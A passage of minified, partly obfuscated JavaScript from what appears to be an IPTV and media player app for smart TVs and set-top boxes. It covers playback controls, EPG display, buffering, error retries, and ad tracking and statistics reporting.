if((pstream&&!is_vod()&&totalTime<150)||isNaN(totalTime))return;$_("arrowtime").style.display="block";var proc=pos-43;if(proc<3)proc=3;else if(proc>(innerW-95))proc=innerW-95;$_("arrowtime").style.left=proc+"px";var y=Math.ceil((pos/innerW)*totalTime);lI1I1IxFCIh1l01llYpr('arrowtime',getTimeFromMS(y));if(platform!="sams"&&(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5")&&!1){$_("thumb").style.display="block";totalTime=Math.round(video.duration);if($_("thumbv")==null||$_("thumbv").currentSrc!=video.currentSrc)lI1I1IxFCIh1l01llYpr('thumb','<video width="'+css_w(128)+'" height="'+css_wh(72)+'" id="thumbv" class="thumb" src="'+video.currentSrc+'"></video>');if(x<26)x=26;$_("thumb").style.left=css_w(x-29)+"px";$_("thumbv").currentTime=y}};$_('jw').onmousemove=$_('player').onmousemove=$_('video').onmousemove=function(event){showPlayer();triggerHide()};video.addEventListener("play",function(){videoLoad("off",-1);getVideoPlayInfo()})}catch(e){console.log(e);kjtYpr.popUp(e.message,5500)}
try{if(platform=="sams"){try{plaginAudio=$_('pluginAudio');plaginNavi=$_('pluginObjectNNavi');naviFirm=plaginNavi.GetFirmware()}catch(e){naviFirm=""}
try{$_('pluginObjectSef').onmousemove=function(event){if(handler=="player"){showPlayer();triggerHide()}};$_('pluginPlayer').onmousemove=function(event){if(handler=="player"){showPlayer();triggerHide()}};document.body.onmousemove=function(event){if(handler=="player"){showPlayer();triggerHide()}};document.onmousemove=function(event){if(handler=="player"){showPlayer();triggerHide()}}}catch(e){console.log(e)}
naviFirm=naviFirm.split('-');if(naviFirm[1]&&(naviFirm[1].indexOf('2011')!=-1||naviFirm[1].indexOf('2012')!=-1||naviFirm[1].indexOf('2013')!=-1||naviFirm[1].indexOf('2014')!=-1||naviFirm[1].indexOf('2015')!=-1)){Player.SefPlugin=$_('pluginObjectSef')};if(Player.SefPlugin!=null){Player.Sef=!0}else{Player.plugin=$_('pluginPlayer');Player.Sef=!1};plaginTVMW=$_('pluginObjectTVMW');if((Player.plugin!=null||Player.Sef)&&plaginTVMW!=null){Player.Screen3Dplugin=$_('pluginObjectScreen3D');if(Player.plugin!=null){Player.plugin.OnBufferingStart='Player.OnBufferingStart';Player.plugin.OnBufferingProgress='Player.OnBufferingProgress';Player.plugin.OnBufferingComplete='Player.OnBufferingComplete';Player.plugin.OnCurrentPlayTime='Player.OnCurrentPlayTime'}
plaginTVMW.SetMediaSource()}else{kjtYpr.inf("Error initialization Player",2000,"red")}}else{video.addEventListener("pause",function(){});video.addEventListener("timeupdate",function(){getVideoPlayInfo()});video.addEventListener("error",function(event){html5error(event)});video.addEventListener("progress",function(){buffering()})}}catch(e){kjtYpr.popUp("ERR2: "+e.message,5500)}}
function err_rek(stat){kjtYpr.inf("");clearTimeout(advTimer);console.log("err_rek "+stat);rek_last=T.inetTime;rek_url="";is_adult=!1;if(handler!="menu")easystop();handler="menu";is_rek=!1;setTimeout("oInset[insetActive].play(null,rek_mode);",250);if(stat!=null){lIl0l1OX1vbll1I1IQYpr("http://browser.appinfo.su/gstatic.php?do=rek&cid="+stat+"&appid="+rek_type+platform+"&hardware="+kjtYpr.hardware+"&box_server="+nServer+"&box_low="+box_low+"&title="+playElement.title)}
setTimeout("is_adult=true;console.log('set rek_n=0;err_rek');rek_n=0;",45000)}
function easystop(onlystop){stopped=!0;try{if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){try{stb.stop()}catch(e){}}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.Stop()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){webapis.avplay.stop();webapis.avplay.close()}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media")samsStop();else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){console.log("easy stop");if(platform=="android-device")video.style.display="none";video.pause()}else{lI1I1IxFCIh1l01llYpr("jw","");lI1I1IxFCIh1l01llYpr("other","")}}catch(e){}
console.log("easy stop "+platform);lI0lI1O1l1Pa100l0Ypr();if(handler=="player"&&lIO1OIOlAQzl1Ol1lYpr!="jw")$_("loading").style.display="block";if(onlystop)return;sendr=!0;iptv_succed=!1;curTime=-1;totalTime=0;$_("popUp").style.display="none";console.log("rek_url "+rek_url);clearTimeout(loaderTimer);clearTimeout(slideTimer);clearTimeout(endTimer);clearTimeout(plmini_timer);clearTimeout(eventtimer);clearTimeout(timeoutWork);epg_select=-1;clearTimeout(setRekTimer);clearTimeout(l1l1lO1NIl1I1ll1YprTimer);if(handler=="player")$_("loading").style.display="block";lI1I1IxFCIh1l01llYpr("ptt","")}
var errauto,xhrremotetime=4800;var html5error=function(event){try{console.log("pstream="+pstream);if(stopped)return;if(lIO1OIOlAQzl1Ol1lYpr!="jw"){console.log("CUR SRC="+$_("video").currentSrc);console.log(event);if(kjtYpr.GL.timeoutiptv>55)return;console.log("stopped="+stopped);if(is_rek&&rek_url!=""&&!stopped&&handler!="menu"){if(ttmac){kjtYpr.popUp("html5error rek="+event.target.error.code,1000)}
if(event.target.error.code>=2&&event.target.error.code!=4)err_rek("errloadfile"+event.target.error.code);return}
if(stopped||handler=="menu"||rek_url!=""||event.target.error.code<2)return}
var tmpCur=curTime;console.log("curTime="+tmpCur);playUrl=streamnum(playElement.url,1);if((!pstream||is_vod())&&curTime>1){errauto=setTimeout(function(){if(!stopped)ll0lIOsIoIIlOlYpr(playUrl,!0,tmpCur)},2500);lI010lp_Z1l1O0Ypr("_FPSoedineniePrervano_!"+curTime+playUrl);return}
iptv_retry++;if(pstream&&iptv_succed){setTimeout("if(!stopped) l0OIQIl1OI0IlI0lIYpr(playUrl,true);",800);lI010lp_Z1l1O0Ypr("_FPOshibka_! _FPPodkluchenie_ "+iptv_retry+"...");return}
if(iptv_retry>3){xhrremotetime=60;setTimeout("if(!stopped) l1llOQI10lW1l_II101Ypr();",1000)}else{if(!plmini_on){t=" _FPpodklucheniya_";lifeN=0;lifeSec=-1;videoLoad("on");l0OIQIl1OI0IlI0lIYpr(playUrl,!0);lI010lp_Z1l1O0Ypr("_FPOshibka_"+t+"! _FPPodkluchenie_  "+(iptv_retry+1)+"...")}}}catch(e){kjtYpr.popUp("html5error "+e.message,1500)}};function FsetFocus(idx){idx=parseInt(idx);cntIndex=parseInt(cntIndex);var ni=cntIndex+idx;if(rowID==2){$_("progressBarClick").style.height="12px";$_("progressBall").style.display="block";if(idx!=0){idx==1?lIl0I1O0Iab1I10Ypr(60):lI1llO1QIebXl10lO1Ypr(-60)}else{resetFocus();$_("progressBall").className+=" progressBallHover";$_("progressBarStatus").className+=" progressBallHover"}}else{$_("progressBarClick").style.height="8px";$_("progressBall").style.display="none";for(var i in allPlayerButton){if(allPlayerButton[i].row[0]==ni&&allPlayerButton[i].row[1]==rowID){resetFocus();cntIndex=ni;if(rowID==3)$_(i).style.background="#ff0000";else $_(i).style.background="#aa2222";break}}}}
function selectedButton(){console.log(rowID+"/"+cntIndex);rowID=parseInt(rowID);cntIndex=parseInt(cntIndex);if(rowID==1&&cntIndex<2){}else if(rek_url!="")return;if(rowID==1){switch(cntIndex){case 0:pauseMedia();break;case 1:if(lI0lOIE0IjIIlOO1Ypr>0&&rek_url==""){console.log("play save "+lI0lOIE0IjIIlOO1Ypr);lO1I011lII1RO0lO1OOYpr();return}
if(paused)goMedia();break;case 2:lI1llO1QIebXl10lO1Ypr();break;case 3:lIl0I1O0Iab1I10Ypr();break;case 4:newOptions();break;case 5:flastView(!0);break;case 6:lIl1lIlI1fO0qOO01lYpr();cntIndex=6;FsetFocus(0);break;case 7:l1OIllOSQ1IQ01IYpr();cntIndex=7;FsetFocus(0);break}}else if(rowID==3){switch(cntIndex){case 0:minimizeplayer(!0);return;break;case 1:l1llOQI10lW1l_II101Ypr();break}}}
function resetFocus(){console.log("resetFocus");for(var i in allPlayerButton){$_(i).style.background=""};$_("progressBall").className="progressBall";$_("progressBarStatus").className="progressBarStatus"}
function triggerHide(t,n){console.log("triggerHide "+t+" / "+n);clearTimeout(hideTimerId);if(handler=="menu"&&stopped)return;if(t==null)t=5000;if(n==null)n=0;hideTimerId=setTimeout("hidePlayer("+n+");",t)}
function hidePlayer(force){if(is_rek)return;if(!force&&($_("loading").style.display=="block"||glSec>0||handler=="qual"||paused||is_rek)){triggerHide(4500)}else{console.log("hide player");if(platform=="android-device")andr.cmd("hideSystemUI");if(uaJ=="mag"){try{stb.SetWinMode(1)}catch(e){}
try{stb.SetTopWin(1)}catch(e){}}else if(uaJ=="dune"){$_("player").style.display="none"}
if(info_mode==1)return;else if(info_mode==3||kjtYpr.GL.time>0){$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("recovery").style.display="none";$_("ptt").style.display="none";$_("epg_full").style.display="none";$_("infPl").style.display="none";$_("pstream").style.display="block";$_("player_time").style.display="block";try{$_("ico_p").style.display="none"}catch(e){}
try{$_("infR").style.display="none"}catch(e){}}else if(info_mode==4){$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("recovery").style.display="none";$_("ptt").style.display="block";$_("pstream").style.display="block";$_("player_time").style.display="block";$_("epg_player").style.display="block";$_("epg_player").style.height=css_wh(85)+"px";try{$_("ico_p").style.display="none"}catch(e){}
try{$_("info_num").style.display="none"}catch(e){}
try{$_("infR").style.display="none"}catch(e){}}else{$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("ptt").style.display="none";$_("pstream").style.display="none";$_("recovery").style.display="none";$_("epg_full").style.display="none"}
$_("thumb").style.display="none";try{$_("arrowtime").style.display="none"}catch(e){}}}
function showPlayer(){if(uaJ=="mag"){try{stb.SetWinMode(0)}catch(e){}
try{stb.SetTopWin(0)}catch(e){}}else if(uaJ=="dune"){$_("player").style.display="block"}
$_("playerBottom").style.display="block";if(!is_rek)$_("buttonTop").style.display="block";else return;$_("ptt").style.display="block";$_("pstream").style.display="block";$_("recovery").style.display="block";try{$_("ico_p").style.display="block"}catch(e){}
try{$_("infR").style.display="block"}catch(e){}
try{$_("info_num").style.display="block";$_("epg_player").style.height=css_wh(45)+"px"}catch(e){}
if(rek_url==""){getshowEpg()}
if(platform=="sams")Player.GetResolution()}
function getshowEpg(m){if(!is_rek&&gP().is_iptv>2&&epg_select>=0&&!plmini_on&&handler!="menu"&&$_("chtitle")!=null){try{$_("epg_full").style.display="block";var e=playElement.epg;var se=null,html="";if(gV(e)!=""){if(typeof epg_ch_full[e]!="undefined")se=epg_ch_full[e];else if(typeof epg_ch[e]!="undefined")se=epg_ch[e]}
console.log("se");if(se!=null){var nj="",knj=0;while(typeof se["title"+nj]!="undefined"){if(epg_time>=se["start"+nj]&&epg_time<se["end"+nj]){curTime=epg_time-se["start"+nj];totalTime=se["end"+nj]-se["start"+nj];if(!is_arc){lI1I1IxFCIh1l01llYpr("remainingTime",getTimeFromMS(curTime).substring(0,5));lI1I1IxFCIh1l01llYpr("totalTime"," / "+getTimeFromMS(totalTime).substring(0,5));var pos=Math.ceil((curTime/totalTime)*innerW);setPosition(pos)}else if(arc_timestamp==0){lI1I1IxFCIh1l01llYpr("totalTime","/"+dt(se["end"+nj])+"<img  height='"+css_wh(18)+"' src='"+_img("_ST_live.png")+"' />");getVideoPlayInfo()}}
if((epg_time)<se["end"+nj]){knj++;html+="<span style='color:rgb(197, 157, 157);'>"+dt(se["start"+nj])+" - "+dt(se["end"+nj])+"</span> "+se["title"+nj]+"<br>"}
if(nj=="")nj=2;else nj++;if(knj>2)break}}
lI1I1IxFCIh1l01llYpr("epg_full",html);if($_("playerBottom").style.display!="block")$_("epg_full").style.display="none";if(html!=""){tl=curCh("title");tl="<div id='progname' style='float:left;font-size:95%;overflow: hidden; width: 15%;'>"+tl+"</div>";lI1I1IxFCIh1l01llYpr("chtitle",tl)}else{if(typeof epg_ch_full[e]!="undefined")delete epg_ch_full[e];lllllllI0hvKh11IIIYpr(playElement)}}catch(e){console.log(e)}}else $_("epg_full").style.display="none"}
function epg_setPos(){if(!is_rek){var e=epg_channels[epg_select].epg;var ep=null;if(typeof e!="undefined"){if(typeof epg_ch_full[e]!="undefined")ep=epg_ch_full[e];else if(typeof epg_ch[e]!="undefined")ep=epg_ch[e]}
if(ep!=null){var nj="";while(typeof ep["title"+nj]!="undefined"){if(epg_time>=ep["start"+nj]&&epg_time<ep["end"+nj])break;if(nj=="")nj=2;else nj++}
curTime=epg_time-ep["start"+nj];totalTime=ep["end"+nj]-ep["start"+nj];if(!is_arc){lI1I1IxFCIh1l01llYpr("remainingTime",getTimeFromMS(curTime).substring(0,5));lI1I1IxFCIh1l01llYpr("totalTime"," / "+getTimeFromMS(totalTime).substring(0,5));var pos=Math.ceil((curTime/totalTime)*innerW);setPosition(pos)}}}}
function buffering(be){if(video||be!=null){try{if(be==null){be=video.buffered.end(0)/video.duration}
var bufferPos=Math.ceil(be*innerW)}catch(e){bufferPos=NaN}
if(!isNaN(bufferPos)){setBufferPosition(bufferPos)}}}
var gl_buf=0;function setBufferPosition(position){if(position==null)position=gl_buf;else gl_buf=position;position-=40;if(position>gl_position)$_("progressBuffer").style.width=(position-gl_position)+'px';else $_("progressBuffer").style.width="0px"}
function resetProgress(){clearTimeout(hideTimerId);showPlayer();$_('progressBall').className='progressBallInitial';$_("progressBuffer").style.width="0px";$_("progressBarStatus").style.width='6px';$_('progressBall').style.marginLeft="-6px";lI1I1IxFCIh1l01llYpr("remainingTime","");lI1I1IxFCIh1l01llYpr("totalTime","");rowID=1;try{FsetFocus(0)}catch(e){console.log(e);kjtYpr.popUp("Err Play media5:<br>"+e.toString(),3000);l0OIQIl1OI0IlI0lIYpr(url)}
mouseDown=!1;dragged=!1}
function getTimeFromMS(sec){var time=Math.round(sec);var hours=Math.floor(time/3600);var mins=Math.floor((time%3600)/60);var secs=Math.floor((time%3600)%60);if(hours<0||mins<0||secs<0)return"&#8734;";if(hours<10)
hours="0"+hours;if(mins<10)
mins="0"+mins;if(secs<10)
secs="0"+secs;return hours+":"+mins+":"+secs}
var gl_position=0;function setPosition(position){gl_position=position;lI1I1IxFCIh1l01llYpr("progressBall","");if(innerW-position<13){$_('progressBall').style.marginLeft="-20px";$_("progressBarStatus").style.width=innerW+'px'}else if(position<=6){$_("progressBarStatus").style.width='6px';$_('progressBall').style.marginLeft="-6px"}else{$_("progressBarStatus").style.width=position+'px';$_('progressBall').style.marginLeft="-6px"}
setBufferPosition()}
var lTime=0,curTime=0,totalTime=0,si=0;function endrek(){$_("popUp").style.display="none";if(ttmac){setTimeout('kjtYpr.popUp("endrek '+curTime+'/'+totalTime+'", 2000);',10000)}
console.log("endrek");kjtYpr.popUp("",100);kjtYpr.lll0Il11OxICbl1ll0Ypr("rek",T.inetTime);if(rek_type=="youtube"||rek_type=="advarkads"){kjtYpr.lll0Il11OxICbl1ll0Ypr("xr",T.inetTime);if(ttmac)kjtYpr.popUp("write "+kjtYpr.l1O0l1gmmv01O11Ypr("xr"),1500)}
if(rek_type=="youtube2"){kjtYpr.lll0Il11OxICbl1ll0Ypr("xr2",T.inetTime);if(ttmac)kjtYpr.popUp("write 2 "+kjtYpr.l1O0l1gmmv01O11Ypr("xr2"),1500)}
is_adult=!1;rek_last=T.inetTime;rek_q=0}
function endvideo(is_android){console.log("endvideo pl="+plmini_on+" "+curTime+"/"+totalTime+" is_android "+is_android);if(plmini_on)return;var curPage=gP();if(l0I110IO1SyqII1lI1Ypr){if($_("vk_audio").style.display=="block"){if(vk_repeat)l1O010LAAOlI1IIYpr(vk_audio_pl,vk_audio_sel);else l1O010LAAOlI1IIYpr(vk_audio_pl,++vk_audio_sel);if(vk_visual){kjtYpr.popUp(vk_audio_pl[vk_audio_sel].description,1500)}
return}}
if(rek_url!=""){endrek();if(is_img(playUrl)||gV(playElement,"type")=="img"||(curTime>1&&totalTime>2)){if(Point["impression"]!=null){l1lllUlxeIO1O1OYpr(Point["impression"],"half")}
if(Point["dstUrl"]!=null){l1lllUlxeIO1O1OYpr(Point["dstUrl"],"half")}
if(Point["start"]!=null){l1lllUlxeIO1O1OYpr(Point["start"],"half");Point["start"]=""}
if(Point["firstQuartile"]!=null){l1lllUlxeIO1O1OYpr(Point["firstQuartile"],"half");Point["firstQuartile"]=""}
if(Point["midpoint"]!=null){l1lllUlxeIO1O1OYpr(Point["midpoint"],"half");Point["midpoint"]=""}
if(Point["thirdQuartile"]!=null){l1lllUlxeIO1O1OYpr(Point["thirdQuartile"],"half");Point["thirdQuartile"]=""}
l1lllUlxeIO1O1OYpr(gV(Point,"complete"),"half");lIl0l1OX1vbll1I1IQYpr("http://browser.appinfo.su/gstatic.php?do=rek&cid=close&appid="+rek_type+platform+"&hardware="+kjtYpr.hardware+"&box_server="+nServer+"&box_low="+box_low+"&title="+curCh("title")+"&"+playUrl);rek_url=""}else{lIl0l1OX1vbll1I1IQYpr("http://browser.appinfo.su/gstatic.php?do=rek&cid=errtimerek&appid="+rek_type+platform+"&hardware="+kjtYpr.hardware+"&vr="+vr+"&box_server="+nServer+"&box_low="+box_low+"&title="+curCh("title"))}
if(platform=="android-device")l1llOQI10lW1l_II101Ypr();else easystop();setTimeout("kjtYpr.l1O0OOzczEvllIOYpr(rek_mode);",500);return}
try{if(is_android){SaveTime("andr");if((pstream&&!is_vod(playUrl))||kjtYpr.GL.next<=0)l1llOQI10lW1l_II101Ypr();else{showPlayer();kjtYpr.popUp("Нажмите Назад или закройте видео для отмены действия <b>"+sNext[kjtYpr.GL.next]+"</b> через 5сек.",5000,"on");timerF=setTimeout(function(){endvideo()},5000)}}else{if(kjtYpr.GL.next==4)return;if(pstream&&!is_vod(playUrl))return;else if(parseInt(kjtYpr.GL.next)==2){easystop();lIIl0Il0LaVOO0OIYpr();l0OIQIl1OI0IlI0lIYpr(playUrl)}else if(parseInt(kjtYpr.GL.next)==1&&parseInt(getSelect())+1<curPage.channels.length&&curPage.channels[parseInt(getSelect())+1].stream_url!='')l1OIllOSQ1IQ01IYpr();else if(parseInt(kjtYpr.GL.next)==3)l1OIllOSQ1IQ01IYpr();else l1llOQI10lW1l_II101Ypr()}}catch(e){l1llOQI10lW1l_II101Ypr()}}
function getCur(){if(is_rek&&rek_curtime>0)return rek_curtime;try{if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){curTime=Player.cur_time}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){curTime=jwplayer("jw").getPosition()}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){curTime=stb.getPositionInSeconds()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){curTime=Player.cur_time/1000}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){curTime=stb.GetPosTime()}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){curTime=Player.cur_time}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){curTime=video.currentTime;if(uaJ=="spark"){curTime=video.currentTime;totalTime=parseInt(video.duration);if(totalTime>11000){totalTime=Math.ceil(totalTime/1000);if(curTime>totalTime)curTime=Math.ceil(curTime/1000)}}}else{try{curTime=media.playPosition/1000}catch(e){curTime=0}}
if(isNaN(curTime)||!isFinite(curTime))curTime=0;curTime=Math.round(curTime)}catch(e){console.log(e);curTime=0}
return curTime}
function getTotal(){if(is_rek&&rek_totaltime>0)return rek_totaltime;try{if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){totalTime=Player.total_time}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){totalTime=jwplayer("jw").getDuration()}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){totalTime=stb.getLengthInSeconds()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){totalTime=webapis.avplay.getDuration()/1000}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){totalTime=stb.GetMediaLen()}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){totalTime=Player.total_time}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){totalTime=video.duration;if(uaJ=="spark"){curTime=video.currentTime;totalTime=parseInt(video.duration);if(totalTime>11000){totalTime=Math.ceil(totalTime/1000);if(curTime>totalTime)curTime=Math.ceil(curTime/1000)}}}else{try{totalTime=media.playTime/1000}catch(e){totalTime=0}}
if(isNaN(totalTime)||!isFinite(totalTime))totalTime=0;totalTime=Math.round(totalTime)}catch(e){console.log(e);totalTime=0}
return totalTime}
var sendr=!0,sendonce=!0,kklp=0;function getVideoPlayInfo(tC,tT){if(glSec!=0)return;try{if(plmini_on)return;si++;if(piframe&&sendr&&tT!=null){sendr=!1}
if(tC!=null)curTime=Math.round(tC);else curTime=getCur();if(tT!=null)totalTime=tT;else totalTime=getTotal();if(l0lOIIIIItWYQ01I0IYpr()){console.log(curTime+"/"+totalTime);if(totalTime-curTime<=6&&totalTime>0){if(!end_ok)endTimer=setTimeout("endvideo();",5200);end_ok=!0}
if(curTime>0&&totalTime>0){var pos=Math.ceil((curTime/totalTime)*292);$_("vk_audio_pos").style.width=css_wh(pos)+"px";lI1I1IxFCIh1l01llYpr("rtma","-"+(to2(totalTime-curTime)))}
return}
if(curTime>0||totalTime>0){if($_("statbar2").style.display!="none")statusbar("off");if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){iptv_succed=!0;iptv_retry=0}
getBufferingInfo();if($_("loading").style.display=="block"){videoLoad("off",curTime)}
if(lIO1OIOlAQzl1Ol1lYpr=="jw"){var html="";if(typeof jwplayer("jw").getVisualQuality().level.width!="undefined")html+=jwplayer("jw").getVisualQuality().level.width+"x"+jwplayer("jw").getVisualQuality().level.height;else if($_("jwvideo")!=null){if($_("jwvideo").videoWidth)html+=$_("jwvideo").videoWidth+"x"+$_("jwvideo").videoHeight}
html+=" "+optScreenJW[kjtYpr.GL.xmode];html+=" "+jwplayer("jw").getProvider().name;if(jwplayer("jw").getQualityLevels().length>1){var bitrate=jwplayer("jw").getQualityLevels()[jwplayer("jw").getCurrentQuality()].bitrate;var quality=jwplayer("jw").getCurrentQuality();if(quality==0)quality="Auto";html+=" Качество: ";if(!isNaN(bitrate))html+=Math.ceil(bitrate/1000)+"kbps";html+=" ["+quality+"/"+(jwplayer("jw").getQualityLevels().length-1)+"]"}
if(jwplayer("jw").getAudioTracks().length>1){var curA=jwplayer("jw").getCurrentAudioTrack();if(curA==0)curA="Auto";html+=" Аудио: "+jwplayer("jw").getAudioTracks()[jwplayer("jw").getCurrentAudioTrack()].name+" ["+curA+"/"+jwplayer("jw").getAudioTracks().length+"]"}
lI1I1IxFCIh1l01llYpr("infR",html)}
if(fst){if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){if(video.videoWidth){lI1I1IxFCIh1l01llYpr("infR",video.videoWidth+"x"+video.videoHeight);lI010lp_Z1l1O0Ypr("")}
if(kjtYpr.GL.xmode>0)setVideoResolution()}
fst=!1}
if(rek_url!=""&&totalTime>0&&curTime>1&&!plmini_on){if(totalTime>600){rek_url="";l1llOQI10lW1l_II101Ypr();setTimeout("kjtYpr.l1O0OOzczEvllIOYpr(lIO1OIOlAQzl1Ol1lYpr);",500);return}
if(lTime!=curTime){lTime=curTime;console.log("rek on "+curTime+"/"+totalTime);if(Point["skipTime"]>0&&Point["skipTime"]<curTime&&curTime<=totalTime){rekBox("Пропустить рекламу <img width=15 src='"+_img("_ST_enter.png")+"' />")}else{if(Point["skipTime"]>0&&Point["skipTime"]<totalTime)var ost=Point["skipTime"]-curTime;else ost=totalTime-curTime;if(ost<0)ost=0;rekBox("Пропустить через "+ost+" сек.")}
if(Point["impression"]!=null){l1lllUlxeIO1O1OYpr(Point["impression"],"half");Point["impression"]=null}
if(Point["dstUrl"]!=null){l1lllUlxeIO1O1OYpr(Point["dstUrl"],"half");Point["dstUrl"]=null}
if(Point["start"]!=null){l1lllUlxeIO1O1OYpr(Point["start"],"half");Point["start"]=null}else if(Math.round(totalTime/2)==curTime){if(Point["firstQuartile"]!=null){l1lllUlxeIO1O1OYpr(Point["firstQuartile"],"half");Point["firstQuartile"]=null}
l1lllUlxeIO1O1OYpr(Point["midpoint"],"half");Point["midpoint"]=null}else if(Math.round(totalTime/4)==curTime){l1lllUlxeIO1O1OYpr(Point["firstQuartile"],"half");Point["firstQuartile"]=null}else if(Math.round((totalTime/4)*3)==curTime){if(Point["midpoint"]!=null){l1lllUlxeIO1O1OYpr(Point["midpoint"],"half");Point["midpoint"]=null}
l1lllUlxeIO1O1OYpr(Point["thirdQuartile"],"half");Point["thirdQuartile"]=null}
if(totalTime-curTime<=1){if(!end_ok)endTimer=setTimeout("endvideo();",1000);end_ok=!0;return}}}
if(playUrlAudio!=""&&sound!=null){if(handler=="menu")sound.pause();else{if(curTime==0)sound.play();if(!paused){if(Math.abs($_("video").currentTime-sound.currentTime)>0&&Math.abs(totalTime-sound.duration)<10&&totalTime>10){if(--soundn<1){if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5")sound.currentTime=$_("video").currentTime;else sound.currentTime=curTime;kjtYpr.popUp("audio sync "+sound.currentTime+"<br>cur="+curTime+"<br>Tot="+totalTime,800);sound.play();soundn=20}}}}}
if(curTime>totalTime&&curTime>11*3600)curTime=0;if(curTime==10&&handler=="player"&&rek_url=="")gP().sendStat(1);if($_("epg_full").style.display=="block"){epg_setPos();return}
if(kjtYpr.l1l0OIlxII1l1IIYpr>0&&rek_url==""){lI0lOIE0IjIIlOO1Ypr=kjtYpr.l1l0OIlxII1l1IIYpr;kjtYpr.l1l0OIlxII1l1IIYpr=0;lO1I011lII1RO0lO1OOYpr();if(lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){}
if(lIO1OIOlAQzl1Ol1lYpr=="html5")video.style.display="block";else $_("jw").style.display="block"}
if(lIO1OIOlAQzl1Ol1lYpr!="jw"&&totalTime>10&&totalTime>curTime&&totalTime-curTime<=5&&(!pstream||is_vod(playUrl))&&rek_url==""&&kjtYpr.GL.next!=4){if(!end_ok)endTimer=setTimeout("endvideo();",6000);end_ok=!0}
if(curTime<30&&totalTime>70&&!paused)getSaveTime();else{lI1I1IxFCIh1l01llYpr("recovery","");lI0lOIE0IjIIlOO1Ypr=0}
if(!is_arc){lI1I1IxFCIh1l01llYpr("remainingTime",getTimeFromMS(curTime));lI1I1IxFCIh1l01llYpr("totalTime","/"+getTimeFromMS(totalTime));var pos=Math.ceil((curTime/totalTime)*innerW);if(pos>innerW)pos=innerW;setPosition(pos);if(curTime>=30&&curTime%15==0)SaveTime()}}
if(is_arc){if(arc_timestamp==0){var xt=T.timestamp}else{xt=arc_timestamp+curTime;lI1I1IxFCIh1l01llYpr("totalTime","<img height='"+css_wh(18)+"' src='"+_img("_ST_archive.png")+"' /> "+gV(playElement,"catchup_days"))}
var tt=T.timestamp-gV(playElement,"catchup_days")*24*3600;var ct=tt+T.timestamp-xt;if(arc_timestamp==0){lI1I1IxFCIh1l01llYpr("remainingTime",dt(xt,!1,!1))}else lI1I1IxFCIh1l01llYpr("remainingTime",dt(xt,!0,!0));pos=Math.ceil(((xt-tt)/(T.timestamp-tt))*innerW);setPosition(pos)}}catch(e){}}
var statU="",statU2="",r2,r2t;function getBufferingInfo(){if(platform!="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"&&pstream){try{var playInfo=media.mediaPlayInfo();var mbitSec=((playInfo.bitrateInstant)/1048576).toFixed(2);if(isNaN(mbitSec)){}else{if(mbitSec>0){lI1I1IxFCIh1l01llYpr("pinfo",""+mbitSec+" Mbit/s")}}}catch(e){}}}
var vk_mini,old_y="";function lI0lllQIIIvMhJ1I11lYpr(pq){if(app_cors_once){app_cors=!1;console.log("set app_cors false")}
var xhr=null;m3u8_url="";var url=pq.url;if(pq.mini)var mini=1;else mini=0;if(url.indexOf("=postmd5")>0){console.log("stream post");var uh=uHelper.create();uh.parse=function(s){console.log("play "+s);if(mini)play_mini(s);else{pq.curCh.url=s;ll0lIOsIoIIlOlYpr(pq.curCh)}}
uh.remote=0;if(gV(pq.curCh,"postmd5")==""){kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_! Empty POST",2000);return""}
uh.postdata="postmd5="+encodeURIComponent(pq.curCh.postmd5);uh.local=1;uh.allowproxy=1;uh.get(url);return"assync"}else if(url.indexOf("#playerjs")>0){lIO1OIOlAQzl1Ol1lYpr="playerjs";uplayer[lIO1OIOlAQzl1Ol1lYpr]={fullscreen:function(){$_("playerjs").contentWindow.postMessage({"api":"fullscreen"},"*")},volume:function(x){$_("playerjs").contentWindow.postMessage({"api":"volume","set":x},"*")},play:function(){$_("jw").style.zIndex="0";$_("playerjs").contentWindow.postMessage({"api":"play"},"*")},pause:function(){$_("playerjs").contentWindow.postMessage({"api":"pause"},"*")},stop:function(){lI1I1IxFCIh1l01llYpr("jw","")},message:function(event){console.log(event);if(event.data.event=="inited"){$_("jw").style.zIndex="2";this.play()}else if(event.data.event=="resumed"){paused=!1}else if(event.data.event=="paused"){paused=!0}else if(event.data.event=="ended"){endvideo()}else if(event.data.event=="time"){Player.cur_time=Math.ceil(event.data.data);Player.total_time=Math.ceil(event.data.duration);if(Player.cur_time>3)$_("jw").style.zIndex="0";else $_("jw").style.zIndex="2";if(Player.total_time>0)getVideoPlayInfo(Player.cur_time,Player.total_time)}else if(typeof 